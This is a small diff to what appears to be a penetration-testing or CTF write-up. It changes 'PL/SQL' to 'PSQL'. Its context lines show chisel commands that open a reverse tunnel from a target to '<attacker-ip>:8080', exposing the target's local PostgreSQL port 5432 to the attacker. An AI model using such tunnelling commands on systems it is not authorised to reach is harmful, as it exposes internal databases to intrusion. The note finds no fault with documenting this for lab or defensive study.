@@ -13,7 +13,7 @@ $ chisel server --socks5 --reverse
 2024/12/25 18:44:39 server: Listening on http://0.0.0.0:8080
 ```
 
-2. Connect to the server and forward 1337 to 5432 to expose the PL/SQL database
+2. Connect to the server and forward 1337 to 5432 to expose the PSQL database
 ```
 chisel client <attacker-ip>:8080 R:1337:127.0.0.1:5432
 ```
